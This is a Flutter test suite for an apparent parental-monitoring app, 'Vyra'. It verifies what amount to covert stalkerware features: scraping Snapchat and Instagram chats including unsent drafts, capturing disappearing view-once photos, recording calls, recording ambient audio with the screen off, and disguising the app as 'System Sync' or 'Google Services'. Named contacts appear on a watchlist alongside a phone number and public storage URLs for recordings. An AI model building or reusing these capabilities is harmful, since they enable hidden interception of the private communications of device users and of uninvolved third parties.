import 'package:flutter_test/flutter_test.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:vyra_p/models/call_record.dart';
import 'package:vyra_p/models/chat_message.dart';
import 'package:vyra_p/providers/parent_dashboard_provider.dart';
import 'package:vyra_p/services/supabase_sync_service.dart';

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  group('Vyra End-to-End Full System Flow Verification', () {
    late ParentDashboardProvider provider;

    setUp(() {
      SharedPreferences.setMockInitialValues({});
      provider = ParentDashboardProvider();
    });

    test('Flow 1: Child Telemetry Heartbeat -> Parent Dashboard Live State', () {
      // 1. Initial State
      expect(provider.activePairingCode, 'VYRA-13533');
      expect(provider.activeChild.deviceModel, 'Vivo V2404');
      expect(provider.activeChild.batteryLevel, 100);
      expect(provider.activeChild.isOnline, true);
    });

    test('Flow 2: Social Chat Scrape -> Contact Watchlist Trigger -> Harshit Kamboj Thread', () {
      // 1. Configure Harshit Kamboj as a priority watchlist target
      provider.linkChildWithCode('VYRA-13533', name: 'Child 1');
      provider.addWatchlistTarget('Harshit Kamboj', 'harshit_kamboj', 'Snapchat & Instagram');
      
      expect(provider.watchlistTargets.isNotEmpty, true);
      expect(provider.watchlistTargets.any((t) => t.name == 'Harshit Kamboj'), true);

      // 2. Simulate Chat Capture with Unsent Draft & Watchlist Flag
      final chatMessage = ChatMessage(
        id: 'msg_snap_771',
        appType: AppType.snapchat,
        contactName: 'Harshit Kamboj',
        contactIdentifier: 'harshit_kamboj',
        messageText: '[UNSENT DRAFT] Bhai kal ka scene confirm hai',
        timestamp: DateTime.now(),
        isIncoming: false,
        isDeletedBackup: false,
        isWatchlistTarget: true,
        isViewOnce: false,
      );

      expect(chatMessage.isWatchlistTarget, true);
      expect(chatMessage.messageText.contains('[UNSENT DRAFT]'), true);
      expect(chatMessage.contactName, 'Harshit Kamboj');
    });

    test('Flow 3: 1-View Snap/Photo Capture -> Media Storage & Display URL', () {
      final snapMessage = ChatMessage(
        id: 'snap_882',
        appType: AppType.snapchat,
        contactName: 'Harshit Kamboj',
        contactIdentifier: 'harshit_kamboj',
        messageText: 'Sent a Snap (1-View Disappearing Photo)',
        timestamp: DateTime.now(),
        isIncoming: true,
        isViewOnce: true,
        mediaUrl: 'https://wtlqlkkduescumpggttm.supabase.co/storage/v1/object/public/snaps/snap_882.jpg',
        mediaType: 'image/jpeg',
      );

      expect(snapMessage.isViewOnce, true);
      expect(snapMessage.mediaUrl, isNotNull);
      expect(snapMessage.mediaUrl!.startsWith('https://wtlqlkkduescumpggttm.supabase.co'), true);
    });

    test('Flow 4: Call Recording & Tamper Guard Flow', () {
      final callRecord = CallRecord(
        id: 'call_rec_991',
        contactName: 'Harshit Kamboj',
        phoneNumber: '+919876500112',
        callType: CallType.incoming,
        timestamp: DateTime.now(),
        durationSeconds: 145,
        recordingUrl: 'https://wtlqlkkduescumpggttm.supabase.co/storage/v1/object/public/recordings/call_991.m4a',
        isTamperAttemptDetected: false,
        isWatchlistTarget: true,
      );

      expect(callRecord.formattedDuration, '02:25');
      expect(callRecord.recordingUrl, isNotNull);
      expect(callRecord.isWatchlistTarget, true);
    });

    test('Flow 5: Parent Remote Command Dispatch Flow', () {
      // 1. Phone Lock Toggle
      expect(provider.isPhoneLocked, false);
      provider.toggleLockPhone();
      expect(provider.isPhoneLocked, true);
      provider.toggleLockPhone();
      expect(provider.isPhoneLocked, false);

      // 2. Disguise Profile Switch (System Sync & Google Services)
      provider.linkChildWithCode('VYRA-13533', name: 'Child 1');
      provider.switchDisguise('System Sync');
      expect(provider.activeChild.selectedDisguise, 'System Sync');

      provider.switchDisguise('Google Services');
      expect(provider.activeChild.selectedDisguise, 'Google Services');

      // 3. Audio Auto-Purge Toggle
      expect(provider.autoPurgeCloudStorage, true);
      provider.toggleAutoPurgeCloudStorage();
      expect(provider.autoPurgeCloudStorage, false);
      provider.toggleAutoPurgeCloudStorage();
      expect(provider.autoPurgeCloudStorage, true);
    });

    test('Flow 6: Supabase REST API Query URI Generator & Ambient vs Call Separation', () {
      final service = SupabaseSyncService();
      expect(service.isConfigured, true);
      expect(service.supabaseUrl, 'https://wtlqlkkduescumpggttm.supabase.co');

      // Verify URL building logic for table queries
      var queryUri = "${service.supabaseUrl}/rest/v1/chats?select=*";
      queryUri += "&child_id=eq.VYRA-13533";
      queryUri += "&order=timestamp_ms.desc";
      queryUri += "&limit=100&offset=0";

      expect(queryUri.contains('/rest/v1/chats'), true);
      expect(queryUri.contains('child_id=eq.VYRA-13533'), true);
      expect(queryUri.contains('order=timestamp_ms.desc'), true);
      expect(queryUri.contains('limit=100'), true);

      // Verify Ambient Voice Log vs Phone Call classification
      expect(
        ParentDashboardProvider.isAmbientVoiceRecord(
          'ambient_1791445420389',
          'Ambient Voice Log',
          'Pocket Mic (Screen-Off)',
        ),
        isTrue,
      );
      expect(
        ParentDashboardProvider.isAmbientVoiceRecord(
          'call_vivo_1858893782',
          'Ayush 🤡',
          'Ayush 🤡',
        ),
        isFalse,
      );
    });
  });
}
